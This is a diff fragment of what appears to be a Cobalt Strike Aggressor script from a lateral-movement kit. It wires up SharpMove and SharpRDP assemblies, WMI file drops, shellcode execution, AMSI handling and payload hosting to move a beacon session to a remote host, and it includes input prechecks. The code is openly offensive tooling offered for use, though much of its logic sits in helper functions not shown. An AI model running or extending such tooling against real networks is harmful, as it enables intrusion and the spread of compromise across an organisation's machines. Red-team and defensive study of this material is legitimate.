+	$latcommand = $2;
+	$payloadtype = $3;
+	$compile = $4;
+	$descname = $5;
+	$exectemplate = $6;
+	$fwbin = "Assemblies/dfw.exe";
+	$sharpasm = "Assemblies/SharpMove.exe";
+
+	if($1['cmdtrigger'] eq "RDP"){
+		$sharpasm = "Assemblies/SharpRDP.exe";
+	}
+
+	if($1['droplocation'] ismatch '.*\\\$'){
+		$drplocation = replace($1['droplocation'], '\\\$', "");
+	}
+	else{
+		$drplocation = $1['droplocation'];
+	}
+	$fwargs = &moveKit::fwargbuilder($1);
+	if($1['droptype'] eq "WMI"){
+		$sharptask = &moveKit::filecmdbuilder($1['location'], $drplocation, $1['filename'], $1['eventname'], $1['computername'], $1['credential'], $latcommand, $1['amsi'], $1['cmdtrigger'], $1['droptype']);
+	}
+	else{
+		$sharptask = &moveKit::proccmdbuilder($latcommand, $1['computername'], $1['credential'], $1['cmdtrigger'], $1['eventname'], $1['amsi']);
+	}
+
+	if($descname eq "PreBuiltCustom Lateral Movement"){
+		&moveKit::customhandler($1, $sharptask, $descname, $fwargs);
+	}
+	else if($descname ismatch '^Shellcode-.*'){
+		&moveKit::shellconly($1, $sharptask, $descname);
+	}
+	else{
+		if($1['auto'] eq "true"){
+			if($descname ismatch '.*-Command.*'){
+				&moveKit::makeplandhost($1, $payloadtype, $descname, $exectemplate, $sharpasm, $sharptask);
+			}
+			else{
+				&moveKit::payloadbuilder($1, $payloadtype, $exectemplate, $descname, $sharptask, $drplocation, $compile, $sharpasm, $fwargs, $fwbin);
+			}
+		}
+		#sleep(2000);
+		#else{
+		&moveKit::execprep($1, $sharpasm, $sharptask, $descname);
+		#}
+	}
+}
+
+sub moveKit::prechecks{
+	local('$bid $listener $descname $help $drptype $plocation $cname $dropn $cmdtrig $customfile $auto')
+	$bid = $1;
+	$listener = $2;
+	$descname = $3;
+	$help = $4;
+	$drptype = $5;
+	$plocation = $6;
+	$cname = $7;
+	$dropn = $8;
+	$cmdtrig = $9;
+	$auto = $10;
+	$customfile = $11;
+
+	if ($help eq 'Help'){
+		if($descname ismatch '.*-Command.*'){
+			&helpMenus::cmdhelpmenu($descname);
+			break;
+		}
+		else{
+			&helpMenus::filehelpmenu($descname);
+			break;
+		}
+	}
+	if($bid eq ""){
+		show_error("You did not specify a session");
+		exit();
+	}
+	if ((listener_info($listener) is $null) && ($descname ne "PreBuiltCustom Lateral Movement")) {
+		berror($bid, "\c4Error: Listener does not exist");
+		exit();
+	}
+	if(($drptype eq "WMI") && ($plocation eq "")){
+		berror($bid, "\c4Error: The 'Location' for WMI file drop was left empty, please enter a valid URL, Windows path, or Linux path");
+		exit();
+	}
+	if(($descname ismatch '.*-Command.*') && ($plocation eq "")){
+		berror($bid, "\c4Error: A location is required for command lateral movement")
+	}
+	if($cname eq ""){
+		berror($bid, "\c4Error: Specify a host to move to");
+		exit();
+	}
+	if(($dropn eq "") && ($auto ne "true")){
+		berror($bid, "\c4Error: A file name is required");
+		exit();
+	}
+	if(($desname eq "PreBuiltCustom Lateral Movement") && ($customfile eq "") && ($auto eq "true")){
+		berror($bid, "\c4Error: Custom Prebuilt file execution requires specify file (local)");
+		exit();
+	}
+	if($cmdtrig eq "RDP"){
+		if(!-exists "Assemblies/SharpRDP.exe"){
+			show_error("The SharpRDP assembly is required for this command trigger type");
+			exit();
+		}
+	}
+	else{
+		if(!-exists script_resource("Assemblies/SharpMove.exe")){
+			show_error("The SharpMove assembly is required for this command trigger type");
+			exit();
+		}
+	}
+
+
+	#Need to do windows dir match test for droplocation or exit if fails
+	#if()
+}
